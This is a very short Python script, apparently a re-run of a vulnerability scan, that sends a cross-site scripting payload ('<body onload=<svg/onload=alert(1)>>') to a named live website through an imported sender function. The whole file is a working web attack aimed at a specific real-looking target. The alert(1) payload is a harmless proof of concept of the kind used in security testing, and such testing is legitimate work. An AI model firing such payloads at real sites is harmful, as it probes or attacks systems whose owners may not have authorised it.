# ponovi_skenu.py
from senka.posiljalac import posalji

cilj = "https://mark8.syfe.com"
payload = "<body onload=<svg/onload=alert(1)>>"

posalji(cilj, payload)
